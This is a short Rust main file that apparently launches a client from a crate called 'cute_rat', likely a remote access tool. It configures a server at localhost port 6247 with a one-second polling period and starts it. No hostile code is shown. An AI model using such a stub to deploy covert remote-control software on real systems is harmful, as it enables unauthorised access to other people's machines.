extern crate cute_rat;
use cute_rat::{Server, Period, TimeUnit};

const DEFAULT_SERVER_ADDR : &str = "127.0.0.1";
const DEFAULT_SERVER_PORT : u16 = 6247;

fn main() {
    let config = cute_rat::Config::new(
        Server::new(DEFAULT_SERVER_ADDR.to_string(), DEFAULT_SERVER_PORT),
        Period::new(1, TimeUnit::Seconds),
        false,
    );
    cute_rat::run(config);
}

